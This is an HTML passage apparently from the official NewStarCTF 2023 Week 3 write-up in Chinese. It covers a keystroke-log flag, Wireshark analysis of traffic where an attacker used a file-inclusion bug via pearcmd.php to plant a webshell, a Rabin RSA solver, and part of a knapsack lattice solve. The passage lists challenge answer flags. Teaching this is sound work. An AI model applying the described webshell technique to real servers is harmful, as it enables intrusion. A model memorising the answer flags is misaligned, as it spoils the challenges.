class="hljs-number">8989</span>&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;4bfa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;<span class="hljs-number">85848584</span>}}}&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;}]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!1yyoou&lt;SPACE&gt;ggot&lt;SPACE&gt;tthhis&lt;SPACE&gt;fllag</div></div><p ql-global="true" line="9CN5">&lt;DEL&gt;表示删除，&lt;SPACE&gt;表示空格，根据这个按键顺序对数据进行处理后得到flag：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="Qxfc" data-language="python" class="ql-code-block ql-word-wrap-true">flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}</div></div><p ql-global="true" line="JsBb"><br></p><h1><div ql-global="true" line="6H6B" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">2-分析</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="9UYc" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">HTTP流量分析、简单溯源</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="J5Ro" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{4069afd7089f7363198d899385ad688b}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="qphu" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="vxMW">Flag由三个信息构成：登录用户名、存在漏洞的文件名、写入的WebShell文件名。</p><p ql-global="true" line="5POY">根据我们的常识，一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="pAxV" data-language="python" class="ql-code-block ql-word-wrap-true">http &amp;&amp; http.request.method == POST</div></div><p ql-global="true" line="Wn4q">可以看到有一个发送给/api/action/login.php的POST请求中有username和password字段：</p><p ql-global="true" class="ql-align-center" line="V4Jr"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1346" height="auto" ori-width="1346" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(7).png" ori-height="714" data-src="https://uploader.shimo.im/f/AfSFFpb4rn5PkdPN.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="XAGd">由此推断出登录的用户名为best_admin。</p><p ql-global="true" line="Sycu">其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="4hUq" data-language="python" class="ql-code-block ql-word-wrap-true">http &amp;&amp; http.response.code != <span class="hljs-number">404</span></div></div><p ql-global="true" line="tq0q">对剩下的流量进行分析，关注到1267号流量响应比较奇怪：</p><p ql-global="true" class="ql-align-center" line="yhbG"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1626" height="auto" ori-width="1626" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(8).png" ori-height="1172" data-src="https://uploader.shimo.im/f/rA8CJdpU6dTWHt68.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="7j6O">很明显存在WebShell，如果做过本周Web题目的应该会比较熟悉，这个响应格式是文件包含漏洞包含pearcmd.php GetShell的响应：</p><p ql-global="true" class="ql-align-center" line="ztTS"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1198" height="auto" ori-width="1198" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(9).png" ori-height="1095" data-src="https://uploader.shimo.im/f/myQv0pXAD27Q5yyb.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="TF1V">由此可以得到剩下的两个信息，index.php文件的page参数存在任意文件包含漏洞，攻击者通过这个漏洞包含pearcmd.php向服务器中写入了名为wh1t3g0d.php的WebShell。</p><p ql-global="true" line="Wz7T">而后续的流量也可以看到攻击者是利用wh1t3g0d.php这个Shell执行了一些系统命令：</p><p ql-global="true" class="ql-align-center" line="BVU7"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1198" height="auto" ori-width="1198" src="./NewStarCTF 2023 Week3 官方WriteUp_files/图片(10).png" ori-height="1095" data-src="https://uploader.shimo.im/f/kznb5PwJh5CoAHLH.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="Ojni">由此得到Flag明文：best_admin_index.php_wh1t3g0d.php</p><p ql-global="true" line="I4x5">整体md5后包裹flag{}得到最终flag：flag{4069afd7089f7363198d899385ad688b}</p><p ql-global="true" line="0nDg"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="xxPC" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Crypto</p><p ql-global="true" class="ql-align-center" line="BHat"><br></p><p ql-global="true" line="Gipj"><br></p><h1><div ql-global="true" line="N9jA" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Rabin's rsa</div></h1><ul data-list-style="circle"><li ql-global="true" line="TLUQ" class="bullet-item"><strong>考点</strong>: rabin</li></ul><ul data-list-style="circle"><li ql-global="true" line="GkCQ" style="line-height: 2.0;" linespacing="115" class="bullet-item"><strong>FLAG</strong>：flag{r4b1n#4c58}</li></ul><ul data-list-style="circle"><li ql-global="true" line="43Nq" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="aBHp">两个地方，同时n很小，可以直接分解</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="IQhm" data-language="python" class="ql-code-block">e = <span class="hljs-number">2</span></div><div line="PSRu" data-language="python" class="ql-code-block"><span class="hljs-keyword">assert</span> p % <span class="hljs-number">4</span> == <span class="hljs-number">3</span></div><div line="aA54" data-language="python" class="ql-code-block"><span class="hljs-keyword">assert</span> q % <span class="hljs-number">4</span> == <span class="hljs-number">3</span></div></div><p ql-global="true" line="tmud">exp.py</p><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="ghwN" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="0QNO" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *</div><div line="S9Wx" data-language="python" class="ql-code-block">p = <span class="hljs-number">13934102561950901579</span></div><div line="AsZd" data-language="python" class="ql-code-block">q = <span class="hljs-number">14450452739004884887</span></div><div line="BRjE" data-language="python" class="ql-code-block">c = <span class="hljs-number">20442989381348880630046435751193745753</span></div><div line="Nzqj" data-language="python" class="ql-code-block"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rabin_attack</span>(<span class="hljs-params">c, n, p, q</span>):</div><div line="BpWm" data-language="python" class="ql-code-block">    c1 = powmod(c, (p+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, p)</div><div line="hAHV" data-language="python" class="ql-code-block">    c2 = powmod(c, (q+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, q)</div><div line="RNAr" data-language="python" class="ql-code-block">    cp1 = p - c1</div><div line="FSRV" data-language="python" class="ql-code-block">    cp2 = q - c2</div><div line="2KNh" data-language="python" class="ql-code-block">    t1 = invert(p, q)</div><div line="bMs9" data-language="python" class="ql-code-block">    t2 = invert(q, p)</div><div line="e2Wz" data-language="python" class="ql-code-block">    m1 = (q*c1*c2 + p*c2*t1) % n</div><div line="GDjq" data-language="python" class="ql-code-block">    m2 = (q*c1*t2 + p*cp2*t1) % n</div><div line="Pd5E" data-language="python" class="ql-code-block">    m3 = (q*cp1*t2 + p*c2*t1) % n</div><div line="nF8T" data-language="python" class="ql-code-block">    m4 = (q*cp1*t2 + p*cp2*t1) % n</div><div line="sXz1" data-language="python" class="ql-code-block">    <span class="hljs-keyword">return</span> m1, m2, m3, m4</div><div line="kDfI" data-language="python" class="ql-code-block">m = rabin_attack(c,p*q,p,q)</div><div line="S8HI" data-language="python" class="ql-code-block"><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> m:</div><div line="ODiA" data-language="python" class="ql-code-block">    <span class="hljs-built_in">print</span>(long_to_bytes(t))</div></div><h1><div ql-global="true" line="SWBw" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>knapsack</div></h1><ul data-list-style="circle"><li ql-global="true" line="VkHo" class="bullet-item"><strong>考点</strong>: 背包密码</li></ul><ul data-list-style="circle"><li ql-global="true" line="dL3w" style="line-height: 2.0;" linespacing="115" class="bullet-item"><strong>FLAG</strong>：flagsLattice_reduction#c3662541}</li></ul><ul data-list-style="circle"><li ql-global="true" line="eJ68" class="bullet-item"><strong>解题步骤</strong></li></ul><div class="ql-code-block-container" data-language="python" spellcheck="false"><div line="SxoW" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="gW2v" data-language="python" class="ql-code-block"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *</div><div line="UQb3" data-language="python" class="ql-code-block">c = <span class="hljs-number">292032237605703789031443546112168465662583427817451138186159085483944596334899153983563673441672190426682450375063969461376062147027084612402086056661404230388212669024682288498017434447903079894895044646783044615700960214968206461515747700863707804674135323403322674848342947433907419384351538542352190054502</span></div><div line="TjQ5" data-language="python" class="ql-code-block">k = [<span class="hljs-number">1608065985136589955518636876548002749173398195805908561413594566081660968014667899832608099402330306643714300075111493399031018875367895290978800182262583676853981874524478795562164083876724225562910617434721559348811325228478100840349704502825475625301310959989478861007648220652524232130866274135218984561</span>, <span class="hljs-number">2426667349302925052753129094681603564581547445694425972149058783410976244113409382609652684285673268926585915465121568674105405583249932303853277106022465162299776054880646164667515914638855621656976695492670793997554806230559887797430130967584045823908435269522635470810929590225201734899469120862897857906</span>, <span class="hljs-number">3429483048920859588228800664056147835206575859139809437729513989612905506968030247732277405170588036945046103148181571731475515968018728356999146064018705816079990332391171720831697179560208441190869409352610039321524663718448744716582427839773919710116270407307201813934309914325458374662174960190245957222</span>, <span class="hljs-number">56425010956371256448246243268037781632639922767089972857768932087073862372804260941055847027639568892620749001152456412613776226413648996114511873854390857464940061288049524118854209263921746793476386468543364294684706273576618917594983701530906450790737740373654984594497994398342234224269852299909786917</span>, <span class="hljs-number">2490148405966221496416605271766917944760574681421947779308643176791508974209226864249738961804267751531920519607253031119552656778832611158482425651360225112014889722067929942129410647789542841451918095993121030645140097940914026737410542029696262008354153670514285804682813068751684055223569331294281905118</span>, <span class="hljs-number">744335516743470311433495353720410462797590932472861071020740460215850064443048990503206674029768738281613724459334902647142111609386032626419807763430772690331198728393460206599560093644541916308699753208688342851978033928606776623217187488326243128140520766001009008201386016425560302128789112878698236289</span>, <span class="hljs-number">3811275049854002124670197266442901370413146380714854518041025464151849775536270057261222936366704504717168540821482432524581823593068766111036867810233424188570517910875954137654522213277153239298775268202412265276391969412101608136450034362297594484127681402703758637422994850056368647615489523794861880847</span>, <span class="hljs-number">4736836665940826041171694132923988931845101417647374332819683867658151216907483131765392822718944507370242286701332413933742097451162974561725364631534151059773942438038783618842467372195820647253852754681662349983386761479952007635484482382467925975261261100119940525951529612029111682683502811860704744107</span>, <span class="hljs-number">2184288239784892480695351146181522343103055473472054415892055011557076197493348610705780911639069852142681212813978124320590741444078993617676557686712572852495709125855358826418698444456009029932606748574019720427857423438968969137406147167435728319431977018686862316554361964818593535134605527966283094812</span>, <span class="hljs-number">588194102339696583350135841824327790124834713596509154434237624805397239340526856351652054792548887203985807293311816082012326594259020613540184041154797618078327175677613074289570022322357182995479906623119955070230707330622384565298411040387807899564480684801466385397273974163223208276864942123556821984</span>, <span class="hljs-number">2077906466303331037266972319970279217258043930377897803588850251077437486936839431262259636827780499338786000900607732211607800334437439411320588909761412208903115247316321339144063222215148211341360284840791579449274150984227297525853407129758195258114613336922940637602426813584054603519438429403287901807</span>, <span class="hljs-number">4060696287458178132166969775611183857321717695909596307983521934391374906105468401724669893440236137597759531026401897954262009158003862889711338109339144634743467096248961069665302863564279743914614929002755913987145938151818768559151108680179120567043334062947260416139148527070005414031278334913676278825</span>, <span class="hljs-number">4648055212181913199241601922647752559148310859063413915617491531022227482221369706329584019871516807125335049899238193299170178941865351952526303264382540623662751970694196678643148804700140310686029928338258113239246369236839815299421412433228129370572769064025027782499557120467483913439554278498904974692</span>, <span class="hljs-number">597176878045185163079857438985773795710566287596407799734356772474742131529190202967137742454916982072691342662052310864747435205021028361215252674178315997198269741467302622198726752215953160339956800052041597499968585794961367600105538786381642026152409490766928746822529886810175008512823872740471937665</span>, <span class="hljs-number">2910054858527388830403932368779621604363339825851733588186642536470920279459927147643083958572082724465912571199462751727511781206448016590724896631420215562383093134176059068836185007547883467363788641586218097259132532988047680444596481336102344068849705827845373152194082875334989539786061281633088702207</span>, <span class="hljs-number">3696225688659541674514429144747887228548438553421347322179321479441707736085490479925695068682857925820906600716811206668674362670255748441491863826159297563586283856711895274967453111525058741957741388117733577248416227857299641721376648385102843604523548256761323973316013492759706736947255531758861421477</span>, <span class="hljs-number">1264925539817716129014576497035166821399904498843295574478016769881855695449072100438634702685104077900942950531746967236836367541973173252729535587899140145556274961468172106138699157373099481772657234211840356840928934367479697752383329641624088906300664151102190244861916711255701268993286008770967460566</span>, <span class="hljs-number">4571007407218171376424110614619883673340506723497157430034356354946308188791286500930618019768782785808738651009380531664322930286075573732857533002268527483303325125815338437710383276782094697464296556561635650192997376958252519129067160493545151596993469863677168612507678829366504521208469249583156145062</span>, <span class="hljs-number">1607275751862389848931579421908559342709368592462574876274965760526121100510794144786052958249913960025018042087109590745931445493710553976077015732888075612716822213569024944317709696157222658354305384754436338586170866943232611395186803895850706105104633938739700570617756272254018986963765629888951737092</span>, <span class="hljs-number">3231482882821525799296232079268975132628226834188813042834644439762217765053533385326968261700098026212043361747011112721207439471171509517132716408625574448212648885013610454405496823675923432663129324575017177361298412424859120473653168845998318565505904460291219279379949917240714510026168261144328754054</span>, <span class="hljs-number">3520756943869114055247771507983524428603360509892140185215072107632169908164209572971189033766284497193142577714214719937690632620807383452941370389221221578877005020761180420690667701357084962898452818923425965250194938713381636834757219964144287681756320982371633697825501678773072609037834441639946225339</span>, <span class="hljs-number">564403960688872564494042565904665280137135985980812477996104058233360726954980651556261866550808047905203807135975257955628888925792823632901368848326812395864809366082008793001123947120817643292945421197846185465088798386204955957297160837369871862119608719565286233632933483485107886825587988325566420769</span>, <span class="hljs-number">315959983412675584879150300480980412474498336983333058244546717323455930859057635392845900347749179949704745226560004600224895066675818550275520877089383803806869595787780164683206194624514937603600847800253240223046758244243173853100476864620378942952204542538466227047478926569550153847751719869006440425</span>, <span class="hljs-number">1359018660778713519182671363124066408395251129592238792702570061458306199066654656327632765206370559628006041477544326679409292399624549148446056002421371779947111512017053024997311782053295887885499499900871425171459104733621657232622887633643535171009046754834506810886208598640313323992402587826510775114</span>, <span class="hljs-number">3143179053950367778166107548875625357080442600180871628766656421101359811522386849734312179769425670257807747763366111882218302544429356682960973863412113938212617992279105368728046281321277793429612514556884875498321471342186005935474830535432685394050401665427753950451870384061138957671000505331584279579</span>, <span class="hljs-number">3424041059481832864742209846632834428678464465053787826056153859972012437109619845448193496222177675021019548028304262054465072804764440535807084060970023895403210534439206560638265706687193261054302798091234069541337163405569239043076218876024343962544888119971652503894076571165979094263390475575893193397</span>, <span class="hljs-number">3394972557115014896582730524811582775165719006608331601536895581299976733846094213905437335060330704042911954267160117024403703576967676979692402911756772597787115284555393956162858666992823855559436532779737873277280234871340407793612861369949533029425471378372119261785736583555982259686027963800114519102</span>, <span class="hljs-number">767982683763338160290017550677214093769106704491468427905876141797664016593400484148498742145536603311483520370631640194250658359513883372410529317557191238184311706705838095244878422832069949895389250127322194863186729472408042980350123307774174867627999479980065280115383136125967992634632411086694698642</span>, <span class="hljs-number">3422540924960544612834585123729733616645553900174459638595137499785110833438504509800635685035170980711379111110998342973555998772845994627938368908066944974448421606476842842744708489409568114738191780149071182251924924154408311173667690121855018031507506246608870132949759899179937794826047342152620292095</span>, <span class="hljs-number">2076628142562411431193260425909220171296705633984743027123722251828899204850932905454098139619184381148082735631705741868953008514407774642601331034180338211496774774791222051968398724513483230081252598969671908696508915091480770301702104673383638671583594522919770174845091152921903576965119090911034877494</span>, <span class="hljs-number">3189000454894790851508643883003404757686995689728100342704292699051819454370619492435584632046952795828014792724252564437409669861386664128425419749205118639851420416805611265987240650591570288819441331386388096898355300213251314193247203474170004062127830101296310662295136957482763725859911828673870073010</span>, <span class="hljs-number">2907150768758367886586716856492146141149987720809000627386111421643110094118983371407767929904033371916068536282044312598041047375502394605750826924668621476494681229069074757407895343467711270265146813743924924350467166961246868819544022337777611791807371441063474009314515450764620220073636926521653862968</span>, <span class="hljs-number">2514385072822938980004922507739039623213197750007579507863286260748435647726447515478421742855973407150598083238408348940948659789166184923325380104358023583968000101986752922281017736336438115334745325808437403756600270989274248698777794299729025975621235093801536125828223010916623183270792167823391314339</span>, <span class="hljs-number">4129101408426925717270552379939869969462339505083750544797736541259757510320156554069476949366400728041791814246488971033168156032323532108146683445223635246667528163299430626189843150118857560146372215307245784118949072729530757857062091860914386530146966295084237748993297755170788155139701609454887642189</span>, <span class="hljs-number">592435070792854036461902755632415150930646219825275494995704405210968841040629694144327928092929922909898934019797113069018676965659448941534627918560192454634915263194744672162906748245323359801539030421486363693479747492739167860076793115084698431784280178395907832496292090848269244845568496776121048420</span>, <span class="hljs-number">2865081789369306893154991033764735467685871707277377218183223375617779981799973856854786718581900741247430593563538242294481420170548368619693814116986102431074746102530574129385108670674829793885445823488366746211939790255318819470661864602435004540416394683778155091007365314457687943582106086383434350861</span>, <span class="hljs-number">251391258714263204956657192185231188943160321652135329260264002476438499179758785954858306203909644226662633694242501403168759406433259397406932989254919691213227015152420952191840925766708845560415152018030431214027920499204307959550731819022116632063749364551316540057073676174948417613616029204682207498</span>, <span class="hljs-number">659384723012287778982874469102674194729642950765762947339029438294465624178903943230781035007197453043407917087130440696900821572650425685604124960327195084069431360651239951933498311555358398796549450526062345075410197217697206633409546614255593820522021931451531912704546349794754510069083609031409248937</span>, <span class="hljs-number">2426015109860963685265746512687937789091377922049478006530805180879855604062651538855351907709057208551010681642061459995570015242556185123653554175228858635684219019015285945979801660351775121696847472734754301551492595986833606031144106471739246647563319118176667308020497901939839988917087746181229065667</span>, <span class="hljs-number">2525877031078673287368055372541347308620587609819404238360987948937210254003467390351489023775890685319458157199265530962051187524661634143415580445422222118839133913670988791987913550492250501569446783701526486015110050320714740192346307908359345974170083063227017143380075781142797561742757168591170431005</span>, <span class="hljs-number">732768928580119156094714905470431755951220001695692967254356266424803019171824186106635920047016493731598322961621456136045426053182174281299298171457892943035628932693593002972569811423472930877675923483250320285199134097063623242942245320335617570876006316142286141477732903642514475998396604403875538126</span>, <span class="hljs-number">1713075318163482543035607888694028734282694723540866771257489312949731729867451895002415031438072105821281931406090644355722934364012514171694359201723633543790142137093107490826535303014605095659846137106308559615589840335232832636723868215269579648052117257204264424008595205714896388849335458748497822543</span>, <span class="hljs-number">3206030671128984113530830309177856630061151077272710507654391758860197005426017882446786133353799298831133785598099494440400390320422585018218554331274457777959194601952893538104960286760312454840928281693976980369524299791880038234512870260756182855709317464342473113313260630724970948400639684898437174131</span>, <span class="hljs-number">445877602282692935696209712317954470877142704864856891828249426135605594268024261646147797545280327679388745908767233133100343152307397565685762453671712145805994933944113578059370014148275504577151287440989172031015611066447856005365332241783974336289375636169009439591968164684890905627670506826067644748</span>, <span class="hljs-number">4295806455136688460282792834328399604062338768814921438926176686908423403962628547564739585989088193984331621676431469210575448270423176766350053455370528181528187650287128113842092773306387117707015664608767974649475285232110757540420290085285387277052398369374412839149430241121901070182878177779766827985</span>, <span class="hljs-number">2315183230747468539901572410823712634195405604813627486581938983970506769088605108642213603692757389396301765946984918156979117789903373888118705804351795764852912596312935816764673348499015426746456365834049611680560504798561899893873110027359835176922898163290326344366278162799640783569200922149384205009</span>, <span class="hljs-number">2709883740389810279365385940437096656562788270606810498693427349076113450585710362125999434154172083927380062042591579804065240386305725680903876683008041411459059118387545472319436308853696256813357089080031992773999500370274225231471068370333280353187355400873961632126707988907859983099391762494801772868</span>, <span class="hljs-number">1905877803809277746039923408128559460261246253332991558138482099322411922204404256653319787704004392297096385734814888648979557467359768233865757035895316271195939258102324258669679336576679363692755368433284226911087680896182728662504500499583917681898428546988994402228245893257641269710985866908742058351</span>, <span class="hljs-number">2777093303340675091580625532323382682129691864696281736202581450688282358145827305972597165522439567019169702252499397105808228982816274171858619196572325252090716164754428653471484126322475352179404916448695972332203909050954267925410042960886379996367981748227262826353064727267433899571018034865132704531</span>, <span class="hljs-number">400099068637092273133972962113072182359643459523164348592014836450122186206026122394030834593959378383718768018630906909662176542621471783076517321930844229460041330895088676945511227366577477141927693769853360094080373738130986776817183221244382063909546208545753556333958009848802143241794378778683932535</span>, <span class="hljs-number">95480232861080887148358949937991373063092649181462448751020036819626579067760501815779519646268230398603103950707525204526097843797674809978090578295201129966765712862260632096215874817242317309284158864004538124514667981606709682660369553173628534354955141758175565938353910452585266775291486924040287287</span>, <span class="hljs-number">4206564390274181347080014243912076202774818568255193589212468833402308873515005261904107407350761468151180411785518045896793882555293831354808573632047790471914302406927630174703561525556261153135936355723670843217968200793417249577620759095486376226873702806966391622687408670670332024471946214244360570527</span>, <span class="hljs-number">769581546817283749107779159740174748523198927410082512915961922766733767813883465793200394139576122978258778956759789880193669138236212424204795874435723563406044571312451089777122691186730272985486340798548572537410198342282788909076007414314743130146594427350337285968643087714868961225425427051443428871</span>, <span class="hljs-number">4205588760010753570183010447576871563608252114372802716375294049628998583455681856572076435197770950017315712210184921961064340013413638913213275784072055670800617280198498410976367292113059360904240872793292322639230272883074388688191241489247501227134113953797523584042177459022347457719985960527177846367</span>, <span class="hljs-number">1673981580767141935253840404067283389285984798963604802473535562441841136663982533621295752542370430497885253698235901516381162311845117952142117326856590929543090980773849180567395429627682737967221875012257442922170543337921831960914249282293152499404813222987199710342332861917285438024389290006917774294</span>, <span class="hljs-number">3839091611022961244047084056865475442636219805237296670005081129521094689404090527874429122484021669796230275449655356421559023294473222085100916762186074843297468793318851172467512250235616943665351451217851892892301363893666565008610824180691077225750190142248598518041362314450625095641688369586817758181</span>, <span class="hljs-number">3887416604133429389606449254495559458167225845439320898274897424317852791696295373313509870873845629557868181477072374026232142315609706739829084179756122068214642915022078095234288540810633350139229158796821451877239399418934904305674776517367438666855891631003570448701637640176452185800424196171496804818</span>, <span class="hljs-number">358492333565676008138804820465560251866006888339882470758115920308108101540837655175739996382881415152755446178429914320270937738321390695745154623432872863053912132168831555266403803315291750052720867125153396272471453072535893765701565177051817002933323643618478950737883667136067774178095466493459619255</span>, <span class="hljs-number">655812335243508201841489724919037171123201658969633886949880732517267083890765645593593434761785507515535515565657116283187784736178668333545133076273636138135833987984809848133611532643367284325904339405911972668756220407073182564506316209055015014469467889679610596073319819057883016116200501750860612158</span>, <span class="hljs-number">3113775244641122181986381191288292039997042853349966089486819525049061751051054873716149031919321626703544417783539774253194197296560794790000355981335530357571600127442879571785843011743587545022436919426522578142377799506957957999574030096426711613548818233897612949883540018947887118158145895368659001913</span>, <span class="hljs-number">3346536951357092794922857686071205592427326377071985417031573600335117248052742314887234312517253459355498430124358526765831884843781046449528488703718774190764032463366296311530766780372073925895846392088965958209670093159081446466328923256632162349085747377661326885434440442540542634700414979519156846378</span>, <span class="hljs-number">2271935487447997615072827715629425090467014316320748569661772071398835781211814130487355070035384524783329644561795490975450269915996630916738702592546834206510451616435749464537109864004197818387853698579320129733065396669474592526208512959974455298956514608692308826341738026708214485942082640212151722824</span>, <span class="hljs-number">776466492143310072596268802159330789564963600828637627540853399297900489203518721000908793370986461631222499074382757467232864517137871669997931139488027084842942095437762256079350478191749823969820341524844810742948700598495048559883397493931440849395912715652538689399792836947662852820103532717567990825</span>, <span class="hljs-number">2414274645882519519084023913396357272407167832626523088150811990492559442026397060738140352663005223129337187125965764012914780402110158227540931469017964124622910527406899007518667711067230671586565911241474521955001186241607041127655651458938731994650169928913125748912643646524991538893335177389904412170</span>, <span class="hljs-number">1587401214609797602331682440041479743512176522669626586231108195155202838917998415252279686533695314095297559308594308729030682798135639449094642378150127492601244357366175151522933633345524386369722790804782728844770761877138025423706525297203340243728319358418982837426599728607392540185563391682179754091</span>, <span class="hljs-number">1276538048517017724799741818279571647670714435038811528782147972756642391251134331211078877513430205745909112356875543624846934625909319249857420925371596921159773634075408031817229527925246856861069484405721039888258313585591750990749824522485321295837665778185313292953880124411255737622409525193124459735</span>, <span class="hljs-number">1538485199904895231757088486985252668728362373981931817960801712480113335144533151864247552181700949983397258308916404658891775035166276951736469913599712794627172532234260428887502063542242388200715134922033848610833955337511115662975240925681126009991412680235365215325155354418216805045691690371175736694</span>, <span class="hljs-number">3206304631930048482883026701884292735383942399324272782150656595986130488178312338403753056282079561305071127800552734066603684476317468336439123025478022512848222910190232348231941471763205513385207943068182799579334996844368914081954765697685511608500913811387200371518850567627179307512637861874238561003</span>, <span class="hljs-number">4060974136109469828397749836390448767241682974331277126152803469744907898850600258735274223294110211845166146970522493710400206529822968619805354770338935377761626067850932707127865463424756008394428715555169827742966901642024793693796316287646900078900367177173010131730253761853898589232594239369879107744</span>, <span class="hljs-number">3186685901580513856509872460979635165561061950606904814133798621836392578498358298660957761557506177619855027178183087244891177317508831823775875116819379713319584842647833087351777216785095435169291029372340194446221915994696340583825222189631540468961340287055426423943291779572102944050203195317543086354</span>, <span class="hljs-number">3136611334284792133367261650890227232936288665608393703140476960273947363995950090616216841862364676224975998313927496717442151280046513059844234925813488608538868806165304615153462666921851828369973348820514900945220768530718340515375059152719890262379622822092495480472265940696852626966083066449081013515</span>, <span class="hljs-number">1331269884708136405117905393673690029448536867574991764756810112456133796939866167105752401710654064799841814208579960739840945274552356162539929238201263094768628435429424780269405617728361664291326922086470728054557840896594861984932337019178564604767425068305896370361563415307622875854960715955519891364</span>, <span class="hljs-number">2629686842528554368371212649266207118104297767714724637715724853710062224883360018658184081051834552922938103680625457768521020704489138289673236192361797218197291790011899341547550168847195307194675782016724355461838129391692029228873360080499876909101598246901009730064927090298523336479377558017493242738</span>, <span class="hljs-number">1426300450885754401333308553071633549193728206537905148455464373889158946625349170708739895297669403110835467058502210376906639329985356457538282521567307751689596391816389876022943463820616797499242065593983413552042271136651578216676477358517644481445202546424950276409332053665700078110891422676737000266</span>, <span class="hljs-number">1115143586269457046388508860118731296403702746525652794518901402580953108524846557836251872330464547316185544242979242626492070655689348375188220456348990656723775351040670864330649927682112162394335389121196801586057211045506076134902459021977861676061786586552967325367078555699852757953879038529960478826</span>, <span class="hljs-number">2367010329759044141740459116302334258738079352309025401865180633681967129718049381760374265533928185763470126970233153393433362149316762427869338542193490619295261584721180390642443116162125260063543158277093503519396667868754170989734908563649702639506310182324432964149001826312565165291959861876316107174</span>, <span class="hljs-number">2369956571182687113385124970548942876722086028916003668607492554799566426508715514710684580412196675124348306094302517736377191146560033416998222407410700276968032415018624603140969715321560855087801587002876000914374065245540460164369067028055684387229685317408498952218117392120145026141932065722734086573</span>, <span class="hljs-number">3854841350561727593245891090625338537089363579767822034014398089229606355892699347245263968564846767146741783584492207093850447805904831377806981335000796755720650243118052758205725952167889135780685666302792946816677759787075975030143263198454358444000314894537861184800223256200612550729345434612069392730</span>, <span class="hljs-number">3401586406886873485507776328101144878822167922493875544544481751600285305001073837485176747426438942163061719012159262979825380870846722864659278767623249012563130053380471007633703779101021876571208363913916417267510669400579106416154511984480469979274724842386104366805464432583011344082510544510387434007</span>, <span class="hljs-number">1780411204742756113339719485654719323514049671655752818458571719669782429217232128095729463729175101515417880396147215050401574197952485666683528215878232167927536265615448461472688261492869669745117088492146391814903227508319392827577962305176903913127589561464776045840282375141308226722660431066262879083</span>, <span class="hljs-number">623158759606146964243321604792792604328830973124825909315869354153270589280565795450154648529086968171949619658615994842143616224671760829560230125417151577087316903718191831791549792534697044357146454674539729006792403062341153282797354669567567369833711554020746696510756773687293614969485135144052897743</span>, <span class="hljs-number">2874962898871141994988116678255360066513926880267417781711095682301520155111915909397882230832415313912219033418575053452819516802259871606128751332802897619812935849791153289338565346476601944570277879083700171017502164694769285858947683642556357324745291066960174235314446585743355585531499937629504399370</span>, <span class="hljs-number">1615873108388769020548178055085255301216704367824197683726890282097172769463327555760194291309353870050824187347172037611766085820383097535855545837318116353353694343187424225078883645748612609371762170267307170926217729936859847075738023340269879295777597249718746227403886887371940212669289587365700336993</span>, <span class="hljs-number">525108755827176036474671732056255094683730135486249812303654723006821993795522820737030334467297449372017838930343899416337585019857607592395449704179963379244795114955118499384308808794611614840974952064962588444759072806096028616305005381563004924825123136405284139928572887251958119886649167419066264050</span>, <span class="hljs-number">918332960100982527049395507203189384302050684796505973689025480448942770394500284124542244610198643370972431577880649249814517167066562245328653608755518782076648032146285166516777171524626837608390406381647370835132346441302989043383145289041797236626680748996797113478650559151911278724265910924039127968</span>, <span 